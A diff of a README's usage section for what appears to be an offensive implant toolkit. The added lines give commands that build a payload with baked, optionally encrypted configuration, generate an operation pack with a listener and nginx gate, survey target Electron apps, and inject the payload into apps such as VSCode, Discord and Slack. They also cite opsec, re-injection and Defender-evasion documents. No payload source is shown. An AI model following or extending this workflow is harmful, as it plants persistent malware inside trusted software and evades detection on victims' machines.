@@ -45,17 +45,24 @@ and strings.
 
 ```bash
 export PATH=/projects/tools/node/bin:$PATH   # self-contained node 22
-npm test                                     # protocol + hygiene + round-trip
-node scripts/build_payload.js --bake op.json --name support
-# unfused app:
-node scripts/inject_asar.js --app "C:\...\VSCode" --payload dist/support.js --name support
-# fused app (Discord/Slack):
-node scripts/inject_unpacked.js --app "C:\...\Discord\app-x.y.z" --payload dist/support.js --name support
+npm test                                     # protocol + hygiene + round-trip (18 tests)
+node scripts/gen_profile.js --op ops/example.json     # op pack: listener + bake + nginx gate
+node scripts/build_payload.js --bake ops/<op>/bake.json --name support
+node scripts/recon.js --app "C:\...\TargetApp"        # fuse/route assessment first
+# loose-file or fused app (validated route — see docs/targets/):
+node scripts/inject_unpacked.js --app "C:\...\resources" --payload dist/support.js \
+     --name support --target app/out/main.js
+# classic unfused asar app (older layouts):
+node scripts/inject_asar.js --app "C:\...\resources\app.asar" --payload dist/support.js --name support
 ```
 
 Any `node >= 18` runs the bundle directly for dev (`node dist/bundle.js` with
 `--fixed-tokens` builds accept `LW_*` env overrides); injected mode needs no
-env at all (sidecar/baked config).
+env at all (baked config, optionally encrypted — 004).
+
+Docs: `docs/opsec.md` (read before prod), `docs/runbook.md` (re-injection),
+`docs/targets/` (verified per-app profiles). Ops gate: `scripts/gate_mde.sh`.
+
 
 ## Roadmap
 
